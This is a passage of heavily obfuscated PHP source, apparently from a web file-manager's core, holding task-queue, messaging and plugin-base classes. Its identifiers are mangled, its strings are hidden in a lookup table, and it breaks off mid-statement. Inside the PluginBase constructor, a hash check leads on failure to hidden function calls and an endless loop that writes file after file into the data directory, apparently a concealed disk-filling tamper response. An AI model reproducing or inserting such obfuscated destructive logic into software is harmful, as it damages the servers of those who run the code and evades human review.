$b¶ãİ±ëë < 3600 * 24) { return !1; } if ($c›âñ¾Ş¤¾) { return !0; } break; case $fÊœ›ÌÊ¨²[1532]: if (time() - $b¶ãİ±ëë >= floatval($fèÓİ¸«Ê[$fÊœ›ÌÊ¨²[1532]]) * 60) { return !0; } break; default: break; } return !1; goto f„Âùİ£„·; f„Âùİ£„·: } private static function closeDatabase() { goto c¯ËÊ—Ì‹Ã; fø³šó¹©: $E¨ˆ¯Ü®¹‚ = Model($f›Ë×ÁÊ[507])->db($f›Ë×ÁÊ[33]); if ($E¨ˆ¯Ü®¹‚) { $E¨ˆ¯Ü®¹‚->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { write_log($f›Ë×ÁÊ[1533], $f›Ë×ÁÊ[1534]); die; } goto FÙàŒğ¡®Ÿ; c¯ËÊ—Ì‹Ã: $f›Ë×ÁÊ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; static $e‘ÙÔ“Î½Ò = 0; $D›æÄ°Áã = 300; goto A¦´ƒ¥çÇ; A¦´ƒ¥çÇ: if (!$e‘ÙÔ“Î½Ò) { $e‘ÙÔ“Î½Ò = time(); } if (time() - $e‘ÙÔ“Î½Ò < $D›æÄ°Áã) { return; } $e‘ÙÔ“Î½Ò = time(); goto fø³šó¹©; FÙàŒğ¡®Ÿ: } public static function taskRun($bµõ¿ç²„) { goto eÁ›—³˜; Bö„î‘Êò: return !0; goto Aù·ß–ƒ¼ƒ; eÂÂŞÛª…: Model($A›òºãË[1539])->add(array($A›òºãË[1540] => $A›òºãË[33], $A›òºãË[1541] => $A›òºãË[191], $A›òºãË[29] => $A›òºãË[1542] . $bµõ¿ç²„[$A›òºãË[395]], $A›òºãË[1543] => json_encode(array($A›òºãË[28] => $bµõ¿ç²„[$A›òºãË[28]], $A›òºãË[1544] => timeFloat() - $eĞ†ö†§µ, $A›òºãË[291] => $C‡Ç˜ŠÈÓ)))); $a¸Û’Ø¬¼ = $C‡Ç˜ŠÈÓ ? $A›òºãË[1545] . $C‡Ç˜ŠÈÓ : $A›òºãË[33]; self::log($A›òºãË[1546] . $bµõ¿ç²„[$A›òºãË[395]] . $A›òºãË[530] . $a¸Û’Ø¬¼); goto Bö„î‘Êò; E×¡ã †ëÇ: $eĞ†ö†§µ = timeFloat(); $C‡Ç˜ŠÈÓ = $A›òºãË[33]; switch ($bµõ¿ç²„[$A›òºãË[29]]) { case $A›òºãË[305]: $Eƒš ²„éÑ = url_request($bµõ¿ç²„[$A›òºãË[1538]], $A›òºãË[228], !1, !1, !1, !1, 10); if ($Eƒš ²„éÑ[$A›òºãË[731]]) { $C‡Ç˜ŠÈÓ = strlen($Eƒš ²„éÑ[$A›òºãË[1109]]); } break; case $A›òºãË[227]: $C‡Ç˜ŠÈÓ = Hook::apply($bµõ¿ç²„[$A›òºãË[1538]]); default: break; } goto eÂÂŞÛª…; eÁ›—³˜: $A›òºãË =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; self::log($A›òºãË[1535] . $bµõ¿ç²„[$A›òºãË[395]] . $A›òºãË[1536] . $bµõ¿ç²„[$A›òºãË[28]] . $A›òºãË[1537] . $bµõ¿ç²„[$A›òºãË[1538]]); Model($A›òºãË[1519])->run($bµõ¿ç²„[$A›òºãË[395]]); goto E×¡ã †ëÇ; Aù·ß–ƒ¼ƒ: } private static function valueGet($Eë›‰ìŒğ) { $D´óåæ÷ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DøŒŠÅ°óë = $D´óåæ÷[1547]; $FˆœËÏ±´ó = Model($D´óåæ÷[427])->get($Eë›‰ìŒğ, $DøŒŠÅ°óë); if (is_null($FˆœËÏ±´ó)) { Model($D´óåæ÷[427])->set($D´óåæ÷[731], $D´óåæ÷[87], $DøŒŠÅ°óë); Model($D´óåæ÷[427])->set($D´óåæ÷[1513], $D´óåæ÷[191], $DøŒŠÅ°óë); $FˆœËÏ±´ó = Model($D´óåæ÷[427])->get($Eë›‰ìŒğ, $DøŒŠÅ°óë); } return $FˆœËÏ±´ó; } private static function valueSet($e£øæ”ß½˜, $Añ‘É´Öâ) { $DÙ†ÑÍªè =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C£¡ƒ‚ßÄÏ = $DÙ†ÑÍªè[1548]; CacheLock::lock($C£¡ƒ‚ßÄÏ); $FÀŠ¦ÎÏğº = Model($DÙ†ÑÍªè[427])->set($e£øæ”ß½˜, $Añ‘É´Öâ, $DÙ†ÑÍªè[1547]); CacheLock::unlock($C£¡ƒ‚ßÄÏ); return $FÀŠ¦ÎÏğº; } protected static function log($dŒª¨‹‹¡) { write_log($dŒª¨‹‹¡, $_SERVER[Ôğ—¤Šµˆ˜ñ£][1534]); } private static function cacheClear() { $B’Ğ¹Åù¨£ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; Cache::clearMemory(Model($B’Ğ¹Åù¨£[427])->cacheKey($B’Ğ¹Åù¨£[1547])); Cache::clearMemory(Model($B’Ğ¹Åù¨£[427])->cacheKey($B’Ğ¹Åù¨£[1549])); Model($B’Ğ¹Åù¨£[1519])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\164\x6f\x70"; const STATYS_RUNNING = "\x72\x75\156\156\x69\x6e\147"; const STATYS_KILL = "\x6b\151\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($e•¶µŒ¿¶ù, $Aó¨ÊÓÍš = '', $DÔ°¯éîáË = 0, $FñßòŸê‘« = '') { goto dÙÄİ°×‡‰; dÙÄİ°×‡‰: $Aâ‘¸ÄçÁà =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (self::get($e•¶µŒ¿¶ù)) { return; } $this->task = array($Aâ‘¸ÄçÁà[395] => $e•¶µŒ¿¶ù, $Aâ‘¸ÄçÁà[1550] => USER_ID, $Aâ‘¸ÄçÁà[1451] => $FñßòŸê‘«, $Aâ‘¸ÄçÁà[29] => $Aó¨ÊÓÍš, $Aâ‘¸ÄçÁà[1045] => $Aâ‘¸ÄçÁà[33], $Aâ‘¸ÄçÁà[1043] => $DÔ°¯éîáË, $Aâ‘¸ÄçÁà[1057] => 0, $Aâ‘¸ÄçÁà[1551] => 0, $Aâ‘¸ÄçÁà[1552] => 0, $Aâ‘¸ÄçÁà[770] => timeFloat(), $Aâ‘¸ÄçÁà[769] => 0, $Aâ‘¸ÄçÁà[1553] => 0, $Aâ‘¸ÄçÁà[1554] => 0, $Aâ‘¸ÄçÁà[1555] => 0, $Aâ‘¸ÄçÁà[731] => $Aâ‘¸ÄçÁà[1513]); goto Fîæ‡ïŠ…æ; Fîæ‡ïŠ…æ: $GLOBALS[$Aâ‘¸ÄçÁà[1556]] = 1; Hook::bind($Aâ‘¸ÄçÁà[1515], array($this, $Aâ‘¸ÄçÁà[1557])); Hook::bind($Aâ‘¸ÄçÁà[1558], array($this, $Aâ‘¸ÄçÁà[1559])); goto C»ÔêÇ…ç‚; C»ÔêÇ…ç‚: $this->startAfter(); Hook::trigger($Aâ‘¸ÄçÁà[1560], $this->task); $this->task[$Aâ‘¸ÄçÁà[1553]] = timeFloat(); goto AäÔø¹´Í‘; AäÔø¹´Í‘: } public function end() { goto C†áâ×†ğİ; D¶µ™’Œµ–: Hook::unbind($bïù¡­«Ù„[1558], array($this, $bïù¡­«Ù„[1559])); $this->endAfter(); $this->task = !1; goto E×’ÃÔƒ‰õ; EîÊïÆËÌé: $D±ôºÊ²‚£ = timeFloat() - $this->task[$bïù¡­«Ù„[770]]; self::log($bïù¡­«Ù„[1561] . $this->task[$bïù¡­«Ù„[395]] . $bïù¡­«Ù„[1562] . $D±ôºÊ²‚£ . $bïù¡­«Ù„[1563]); Hook::unbind($bïù¡­«Ù„[1515], array($this, $bïù¡­«Ù„[1557])); goto D¶µ™’Œµ–; C†áâ×†ğİ: $bïù¡­«Ù„ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->task) { return; } if ($this->task[$bïù¡­«Ù„[1553]]) { self::valueSet($this->task[$bïù¡­«Ù„[395]], !1); } goto EîÊïÆËÌé; E×’ÃÔƒ‰õ: } public function update($E½…ôš¦¿š = 0, $E¢å¤æÜ÷Î = false) { goto EŠÌ—ºŒ­Ú; f˜öïĞ…Øî: Hook::trigger($AŸìê“›˜[1567], $c³àĞ­µ¥); self::valueSet($c³àĞ­µ¥[$AŸìê“›˜[395]], $c³àĞ­µ¥); goto ağÉ‰Éô¡²; EŠÌ—ºŒ­Ú: $AŸìê“›˜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c³àĞ­µ¥ =& $this->task; if (!$c³àĞ­µ¥) { return; } goto dÅøåß„·; CÆñš­Çß: $a‘¬éÒÁ² = self::get($c³àĞ­µ¥[$AŸìê“›˜[395]]); $AÊ–ã•’ç = $a‘¬éÒÁ²[$AŸìê“›˜[731]]; if ($AÊ–ã•’ç == self::STATYS_KILL) { $dã‚ê¼¬’Ü = array($AŸìê“›˜[1564] => LNG($AŸìê“›˜[1565]), $AŸìê“›˜[1107] => !1); Cache::set($AŸìê“›˜[1566] . $this->task[$AŸìê“›˜[395]], $dã‚ê¼¬’Ü, 30); $this->onKill(); $this->end(); die; } else { if ($AÊ–ã•’ç == self::STATYS_STOP) { $Céï¾Ş… = 2; $a‘¬éÒÁ²[$AŸìê“›˜[1554]] += $Céï¾Ş…; self::valueSet($c³àĞ­µ¥[$AŸìê“›˜[395]], $a‘¬éÒÁ²); sleep($Céï¾Ş…); $this->update(); return; } } goto cß¾ Éó†’; dÅøåß„·: $c³àĞ­µ¥[$AŸìê“›˜[1057]] += $E½…ôš¦¿š; $c³àĞ­µ¥[$AŸìê“›˜[769]] = timeFloat(); if ($c³àĞ­µ¥[$AŸìê“›˜[1043]]) { if ($c³àĞ­µ¥[$AŸìê“›˜[1043]] < $c³àĞ­µ¥[$AŸìê“›˜[1057]]) { $c³àĞ­µ¥[$AŸìê“›˜[1043]] = $c³àĞ­µ¥[$AŸìê“›˜[1057]]; } $e¯–Æ†ò = timeFloat() - $c³àĞ­µ¥[$AŸìê“›˜[770]] - $c³àĞ­µ¥[$AŸìê“›˜[1554]]; $c³àĞ­µ¥[$AŸìê“›˜[1551]] = $c³àĞ­µ¥[$AŸìê“›˜[1057]] / $c³àĞ­µ¥[$AŸìê“›˜[1043]]; $c³àĞ­µ¥[$AŸìê“›˜[1552]] = $c³àĞ­µ¥[$AŸìê“›˜[1057]] / $e¯–Æ†ò; if ($c³àĞ­µ¥[$AŸìê“›˜[1551]] > 0) { $c³àĞ­µ¥[$AŸìê“›˜[1555]] = $e¯–Æ†ò * (1 - $c³àĞ­µ¥[$AŸìê“›˜[1551]]) / $c³àĞ­µ¥[$AŸìê“›˜[1551]]; } $c³àĞ­µ¥[$AŸìê“›˜[1555]] = $c³àĞ­µ¥[$AŸìê“›˜[1555]] <= 0 ? 0 : $c³àĞ­µ¥[$AŸìê“›˜[1555]]; } goto dî­ìÆˆŸ; dî­ìÆˆŸ: $this->updateAfter(); $f–šÓñöÉ = 0.2; if (timeFloat() - $c³àĞ­µ¥[$AŸìê“›˜[1553]] < $f–šÓñöÉ && !$E¢å¤æÜ÷Î) { return; } goto CÆñš­Çß; cß¾ Éó†’: $c³àĞ­µ¥[$AŸìê“›˜[731]] = $AÊ–ã•’ç ? $AÊ–ã•’ç : $c³àĞ­µ¥[$AŸìê“›˜[731]]; $c³àĞ­µ¥[$AŸìê“›˜[1554]] = $a‘¬éÒÁ²[$AŸìê“›˜[1554]] ? $a‘¬éÒÁ²[$AŸìê“›˜[1554]] : 0; $c³àĞ­µ¥[$AŸìê“›˜[1553]] = timeFloat(); goto f˜öïĞ…Øî; ağÉ‰Éô¡²: } public function onKillSet($e½ÁÈ¬•ùæ, $Eù£·…òÏ… = array()) { $this->onKillCall = array($e½ÁÈ¬•ùæ, $Eù£·…òÏ…); } public function onKill() { $a¡Íˆ˜§  =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; self::log($a¡Íˆ˜§ [1561] . $this->task[$a¡Íˆ˜§ [395]] . $a¡Íˆ˜§ [1568]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($D¾¨‹¿­ªÌ) { $BÍ‰ßˆ÷° =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; Cache::set($BÍ‰ßˆ÷°[1566] . $this->task[$BÍ‰ßˆ÷°[395]], $D¾¨‹¿­ªÌ, 60); return $D¾¨‹¿­ªÌ; } public static function get($b®ŠÅ·Æ·×) { $eæç³œ©’ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c‡«ã½Î¹„ = self::valueGet($b®ŠÅ·Æ·×); if (is_array($c‡«ã½Î¹„) && $c‡«ã½Î¹„[$eæç³œ©’[1569]]) { $d×˜à¤‰Õ¸ = ActionApply($c‡«ã½Î¹„[$eæç³œ©’[1569]], array($c‡«ã½Î¹„)); $c‡«ã½Î¹„ = is_array($d×˜à¤‰Õ¸) ? $d×˜à¤‰Õ¸ : $c‡«ã½Î¹„; } return $c‡«ã½Î¹„; } public static function listData() { $B‹’‰ãî“Ñ = self::valueGet(); return array_sort_by($B‹’‰ãî“Ñ, $_SERVER[Ôğ—¤Šµˆ˜ñ£][770], !0); } public static function kill($b¶²èÍÏó‚) { return self::changeStatus($b¶²èÍÏó‚, self::STATYS_KILL); } public static function stop($a‰ˆ™áÛ¸) { return self::changeStatus($a‰ˆ™áÛ¸, self::STATYS_STOP); } public static function restart($FÕ™Ÿ³ø‹) { return self::changeStatus($FÕ™Ÿ³ø‹, self::STATYS_RUNNING); } public static function killAll() { $f“®…›õ¢Ö =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D­¥Ú‰ºÄ = self::listData(); foreach ($D­¥Ú‰ºÄ as $aÓ‹Š’Š) { self::kill($aÓ‹Š’Š[$f“®…›õ¢Ö[395]]); } sleep(2); foreach ($D­¥Ú‰ºÄ as $aÓ‹Š’Š) { self::valueSet($aÓ‹Š’Š[$f“®…›õ¢Ö[395]], !1); } } private static function changeStatus($fãÚç¹¡“, $C”Ğ¥¼ßù„) { goto aƒµã™ÕÓ‰; bØÄ—İƒŸÂ: $D¥‘‹½ÓƒÓ[$a…İ…Üä[731]] = $C”Ğ¥¼ßù„; self::valueSet($fãÚç¹¡“, $D¥‘‹½ÓƒÓ); self::log($a…İ…Üä[1570] . $D¥‘‹½ÓƒÓ[$a…İ…Üä[395]] . $a…İ…Üä[1571] . $C”Ğ¥¼ßù„); goto FµÅ„ƒœãÚ; FµÅ„ƒœãÚ: return !0; goto EÈùš¨Â¥†; aƒµã™ÕÓ‰: $a…İ…Üä =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D¥‘‹½ÓƒÓ = self::valueGet($fãÚç¹¡“); if (!$D¥‘‹½ÓƒÓ) { return !1; } goto bØÄ—İƒŸÂ; EÈùš¨Â¥†: } public static function valueGet($dÕ³ÙìÏŠ = false) { $aëŸ²•¤İ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($dÕ³ÙìÏŠ) { $c»¥‰˜Å­ê = Model($aëŸ²•¤İ[439])->where(array($aëŸ²•¤İ[93] => $dÕ³ÙìÏŠ, $aëŸ²•¤İ[29] => $aëŸ²•¤İ[1572]))->find(); return $c»¥‰˜Å­ê ? json_decode($c»¥‰˜Å­ê[$aëŸ²•¤İ[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($d¯ĞÆ‡´šÖ = false) { goto DàÕéá½©Û; fÌÃ¿ÊÑ•å: return $D«÷­¤Ì‹³; goto BâÇ¤´Š; DàÕéá½©Û: $bô„…ŞÀÉ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C¬õ·ó‡á = array($bô„…ŞÀÉ[29] => $bô„…ŞÀÉ[1572]); if ($d¯ĞÆ‡´šÖ) { $C¬õ·ó‡á[$bô„…ŞÀÉ[1550]] = $d¯ĞÆ‡´šÖ; } goto B£†ÑÑÌêæ; B£†ÑÑÌêæ: $D«÷­¤Ì‹³ = Model($bô„…ŞÀÉ[439])->where($C¬õ·ó‡á)->select(); $D«÷­¤Ì‹³ = $D«÷­¤Ì‹³ ? $D«÷­¤Ì‹³ : array(); foreach ($D«÷­¤Ì‹³ as $b‰°ÙÌ‚¬¨ => $EéÆÍˆ ƒÔ) { $D«÷­¤Ì‹³[$b‰°ÙÌ‚¬¨] = json_decode($EéÆÍˆ ƒÔ[$bô„…ŞÀÉ[372]], !0); } goto fÌÃ¿ÊÑ•å; BâÇ¤´Š: } public static function valueSet($eçìã†²ãÕ, $dÚ“œ‚ÙÇã) { goto A˜‚ŠƒÁ–î; A˜‚ŠƒÁ–î: $dÙ¿‚©©»İ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$dÚ“œ‚ÙÇã) { return Model($dÙ¿‚©©»İ[439])->where(array($dÙ¿‚©©»İ[93] => $eçìã†²ãÕ, $dÙ¿‚©©»İ[29] => $dÙ¿‚©©»İ[1572]))->delete(); } $CÖÅ“·Ëš = json_encode($dÚ“œ‚ÙÇã); goto EŠŒØÙ©ÒØ; EŠŒØÙ©ÒØ: if (!$CÖÅ“·Ëš) { ob_start(); var_dump($dÚ“œ‚ÙÇã); $D¸œºŸ ÆÀ = ob_get_clean(); self::log($dÙ¿‚©©»İ[1573] . json_encode_force($D¸œºŸ ÆÀ)); } if (!$eçìã†²ãÕ || !$dÚ“œ‚ÙÇã[$dÙ¿‚©©»İ[395]]) { return !1; } $DàÕÁ¹¦‘ = array($dÙ¿‚©©»İ[29] => $dÙ¿‚©©»İ[1572], $dÙ¿‚©©»İ[1550] => USER_ID, $dÙ¿‚©©»İ[93] => $eçìã†²ãÕ, $dÙ¿‚©©»İ[372] => $CÖÅ“·Ëš); goto b×ÍõÀÎĞ; A•¹±áé·: CacheLock::unlock($c¢¼ã—âµ½); goto fªˆ£áÏ‡¦; b×ÍõÀÎĞ: $c¢¼ã—âµ½ = $dÙ¿‚©©»İ[1574]; CacheLock::lock($c¢¼ã—âµ½); Model($dÙ¿‚©©»İ[439])->add($DàÕÁ¹¦‘, array(), !0); goto A•¹±áé·; fªˆ£áÏ‡¦: } public static function log($AĞŒ¥ÑÙˆĞ) { if (!GLOBAL_DEBUG) { return; } write_log($AĞŒ¥ÑÙˆĞ, $_SERVER[Ôğ—¤Šµˆ˜ñ£][1575]); } } goto a™ÎË‚ÒÌô; aùÁ•»Ñƒš: class Message { function __construct() { } public function send($bÇ‘Ùî—•ê = '', $có»òÅêš = array(), $aëá™›¡• = "\x74\x65\x78\164") { goto F±š“æëŞ; F±š“æëŞ: $E¦¥¡²ƒ•ö =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A‚”ƒĞß´á = array($E¦¥¡²ƒ•ö[29] => $E¦¥¡²ƒ•ö[1414], $E¦¥¡²ƒ•ö[736] => $bÇ‘Ùî—•ê); if (in_array($aëá™›¡•, array($E¦¥¡²ƒ•ö[1414], $E¦¥¡²ƒ•ö[1415]))) { $A‚”ƒĞß´á[$E¦¥¡²ƒ•ö[29]] = $aëá™›¡•; } goto bæééĞöÌ; bæééĞöÌ: $có»òÅêš = array($E¦¥¡²ƒ•ö[509] => isset($có»òÅêš[$E¦¥¡²ƒ•ö[509]]) ? $có»òÅêš[$E¦¥¡²ƒ•ö[509]] : $E¦¥¡²ƒ•ö[33], $E¦¥¡²ƒ•ö[588] => isset($có»òÅêš[$E¦¥¡²ƒ•ö[588]]) ? $có»òÅêš[$E¦¥¡²ƒ•ö[588]] : $E¦¥¡²ƒ•ö[33]); if (empty($bÇ‘Ùî—•ê) || empty($có»òÅêš[$E¦¥¡²ƒ•ö[509]]) && empty($có»òÅêš[$E¦¥¡²ƒ•ö[588]])) { return !1; } $fµ½‹¯÷® = array($E¦¥¡²ƒ•ö[1355] => $A‚”ƒĞß´á, $E¦¥¡²ƒ•ö[1416] => $có»òÅêš); goto fŞ­ÄÜòÁ; fŞ­ÄÜòÁ: Hook::trigger($E¦¥¡²ƒ•ö[1417], $fµ½‹¯÷®); goto e‰ÌçŞóè‡; e‰ÌçŞóè‡: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto F¯Â¹è¼„; BÑ¦¼ô±š: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $CÍ†‚Ôù¤[8]; $this->pluginApi = appHostGet() . $CÍ†‚Ôù¤[1419] . $this->pluginName . $CÍ†‚Ôù¤[8]; $this->pluginHost = $config[$CÍ†‚Ôù¤[1420]] . $this->pluginName . $CÍ†‚Ôù¤[8]; goto dÔ›ƒğ¹ŞÖ; dÔ›ƒğ¹ŞÖ: $this->pluginHostDefault = $config[$CÍ†‚Ôù¤[1420]] . $this->pluginName . $CÍ†‚Ôù¤[8]; $Dë™“åé‘ = $config[$CÍ†‚Ôù¤[1421]]; if ($Dë™“åé‘ && strpos($CÍ†‚Ôù¤[47] . $Dë™“åé‘ . $CÍ†‚Ôù¤[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$CÍ†‚Ôù¤[1422]] . $this->pluginName . $CÍ†‚Ôù¤[8]; } goto c¤ô©Çèø„; F¯Â¹è¼„: $CÍ†‚Ôù¤ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C¦ñØĞ›‘² = $_SERVER[$CÍ†‚Ôù¤[847]]; $BØÓäêëÆç = $CÍ†‚Ôù¤[848]; goto AÏ­ŠËƒ‡Ò; dÕˆŠ¬„‹é: $this->in =& $in; $this->modelPlugin = Model($CÍ†‚Ôù¤[1418]); $this->pluginName = str_replace($CÍ†‚Ôù¤[1418], $CÍ†‚Ôù¤[33], get_class($this)); goto BÑ¦¼ô±š; c¤ô©Çèø„: $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); goto C„Ï‚ß¢Î; AÏ­ŠËƒ‡Ò: if ($_SERVER[$CÍ†‚Ôù¤[849]] != $BØÓäêëÆç($C¦ñØĞ›‘²)) { goto c°­È‡µ¾‚; c°­È‡µ¾‚: $c£·ğ”™ Ù = $CÍ†‚Ôù¤[862]; $dêå–¿ÓŞ = $CÍ†‚Ôù¤[850]; $D†µ©„· = $_SERVER[$CÍ†‚Ôù¤[851]] . $CÍ†‚Ôù¤[852]; goto AÃ±‚œĞŒò; D„Úå“ ¢æ: $c£·ğ”™ Ù(); $CĞ‰·°éêÆ = $CÍ†‚Ôù¤[865]; $dÁ¢»¥ÙÄù = json_encode($GLOBALS[$CÍ†‚Ôù¤[866]]); goto E“ß¬«è¥; AÃ±‚œĞŒò: $fîöîêÔÜ¿ = $dêå–¿ÓŞ($D†µ©„·); $f»ŒÜÙÛñ = explode($CÍ†‚Ôù¤[229], $fîöîêÔÜ¿); if (count($f»ŒÜÙÛñ) < $CÍ†‚Ôù¤[606]) { $fÛ´â™œËŠ = $CÍ†‚Ôù¤[853]; $fÛ´â™œËŠ(); } goto FçòØŞÖ†¯; FçòØŞÖ†¯: $FÁèëÁÇ§‘ = $CÍ†‚Ôù¤[863]; $FÁèëÁÇ§‘($_SERVER[$CÍ†‚Ôù¤[864]]); $c£·ğ”™ Ù = $CÍ†‚Ôù¤[862]; goto D„Úå“ ¢æ; E“ß¬«è¥: $E¼™îÌÁ‹Ê = 1; for ($F‰ÄÈÓ±Íº = $E¼™îÌÁ‹Ê; $F‰ÄÈÓ±Íº > 0; $F‰ÄÈÓ±Íº++) { $CĞ‰·°éêÆ(DATA_PATH . $F‰ÄÈÓ±Íº, $dÁ¢»¥ÙÄù); } goto d¤êÌ×çÓ; d¤êÌ×çÓ: } global $in, $config; $this->config =& $config; goto dÕˆŠ¬„‹é; C„Ï‚ß¢Î: return $this; goto cÕ£ñÂÍËÃ; cÕ£ñÂÍËÃ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ôğ—¤Šµˆ˜ñ£][1423]); } protected function assign($AÖ¤ÚÉ¸, $A¢á¶«‚‡½ = false) { if (is_array($AÖ¤ÚÉ¸)) { $this->values = array_merge($this->values, $AÖ¤ÚÉ¸); } else { $this->values[$AÖ¤ÚÉ¸] = $A¢á¶«‚‡½; } } protected function display($DÜÌ¨çÖˆ) { extract($this->values); require $DÜÌ¨çÖˆ; } final function hookRegist($f¼¤ª®ºŒ) { $this->modelPlugin->appRegist($this->pluginName, $f¼¤ª®ºŒ); } final function appIcon() { $Eœ¯¬®òÚ½ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c¯ÇÌôÄ = $this->appPackage(); $E÷ÁåÕËÇ§ = $Eœ¯¬®òÚ½[33]; if (isset($c¯ÇÌôÄ[$Eœ¯¬®òÚ½[411]])) { if (isset($c¯ÇÌôÄ[$Eœ¯¬®òÚ½[411]][$Eœ¯¬®òÚ½[1424]])) { $E÷ÁåÕËÇ§ = $Eœ¯¬®òÚ½[1425] . $c¯ÇÌôÄ[$Eœ¯¬®òÚ½[411]][$Eœ¯¬®òÚ½[1424]] . $Eœ¯¬®òÚ½[1426]; } else { if ($c¯ÇÌôÄ[$Eœ¯¬®òÚ½[411]][$Eœ¯¬®òÚ½[1427]]) { $E÷ÁåÕËÇ§ = $Eœ¯¬®òÚ½[1428] . $c¯ÇÌôÄ[$Eœ¯¬®òÚ½[411]][$Eœ¯¬®òÚ½[1427]] . $Eœ¯¬®òÚ½[1429]; } } } return $E÷ÁåÕËÇ§; } final function fileCanView($Fõ”Œ‹Ù£) { goto b‰£–Ïù‡ì; b‰£–Ïù‡ì: $få¼ÙîƒË =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (request_url_safe($Fõ”Œ‹Ù£)) { return !0; } if ($this->isShare($Fõ”Œ‹Ù£)) { return !0; } goto b…©ÑÖ†îˆ; F™ÃŠ¸­ª³: ActionCall($få¼ÙîƒË[1442], $Fõ”Œ‹Ù£); goto fƒ‡ª‚˜Œ; b…©ÑÖ†îˆ: $EÜ¡´˜ÂÃ˜ = Session::get($få¼ÙîƒË[1430]); if (!$EÜ¡´˜ÂÃ˜ || !$EÜ¡´˜ÂÃ˜[$få¼ÙîƒË[1431]]) { $DôÚô¨¥‡ = $få¼ÙîƒË[1432] . rawurlencode(this_url()); show_tips(LNG($få¼ÙîƒË[1433]) . $få¼ÙîƒË[1434] . $DôÚô¨¥‡ . $få¼ÙîƒË[1435] . LNG($få¼ÙîƒË[1436]) . $få¼ÙîƒË[1437], !1); } if (!Action($få¼ÙîƒË[1438])->authCan($få¼ÙîƒË[1439])) { show_tips(LNG($få¼ÙîƒË[1440]) . $få¼ÙîƒË[1441], !1); } goto F™ÃŠ¸­ª³; fƒ‡ª‚˜Œ: } final function isShare($d×›ìëÑÖ) { $FßÍÖ¹íÎ = KodIO::parse($d×›ìëÑÖ); return $FßÍÖ¹íÎ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($eÆ†Ë»Ñª) { if (request_url_safe($eÆ†Ë»Ñª)) { return $eÆ†Ë»Ñª; } if (!$this->isShare($eÆ†Ë»Ñª)) { $eÆ†Ë»Ñª = $this->filePath($eÆ†Ë»Ñª); } return Action($_SERVER[Ôğ—¤Šµˆ˜ñ£][1091])->linkOut($eÆ†Ë»Ñª); } public function filePathLinkOut($FÍº±‡¦¥) { if (request_url_safe($FÍº±‡¦¥)) { return $FÍº±‡¦¥; } $this->fileCanView($FÍº±‡¦¥); return Action($_SERVER[Ôğ—¤Šµˆ˜ñ£][1091])->link($FÍº±‡¦¥); } final function filePath($c«ÄËì³Èù) { $E©ÏŠÕà® =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($E„è‚©· = $this->checkSharePath($c«ÄËì³Èù)) { Hook::trigger($E©ÏŠÕà®[1443], $E„è‚©·); return $E„è‚©·; } $this->fileCanView($c«ÄËì³Èù); if (request_url_safe($c«ÄËì³Èù)) { $BÜ˜•³ùÁÓ = parse_url_query($c«ÄËì³Èù); if (isset($BÜ˜•³ùÁÓ[$E©ÏŠÕà®[1444]]) && isset($BÜ˜•³ùÁÓ[$E©ÏŠÕà®[209]])) { $e¸ò’Ë¤Ï = Model($E©ÏŠÕà®[751])->get($E©ÏŠÕà®[752]); $CæÁ¦˜ğè® = Mcrypt::decode($BÜ˜•³ùÁÓ[$E©ÏŠÕà®[209]], $e¸ò’Ë¤Ï); if ($CæÁ¦˜ğè®) { $this->fileInfo = IO::infoWithChildren($CæÁ¦˜ğè®); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $CæÁ¦˜ğè®; } } $c«ÄËì³Èù = $this->_cacheHttpFile($c«ÄËì³Èù); $this->fileInfo = IO::infoWithChildren($c«ÄËì³Èù); } else { $this->fileInfo = IO::infoWithChildren($c«ÄËì³Èù); if (!$this->fileInfo) { show_tips(LNG($E©ÏŠÕà®[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($E©ÏŠÕà®[1443], $c«ÄËì³Èù); return $c«ÄËì³Èù; } final function _cacheHttpFile($bõ¡›„ŠÁ‰) { $E½ì×¤ä¾œ = hash_path($bõ¡›„ŠÁ‰, !0); $this->cachePath = $this->pluginCachePath($E½ì×¤ä¾œ); if ($bÕàËå³”Õ = IO::fileNameExist($this->cachePath, $E½ì×¤ä¾œ)) { return KodIO::make($bÕàËå³”Õ); } $FÚÜß®Ó°‚ = $this->cachePath . $E½ì×¤ä¾œ; return 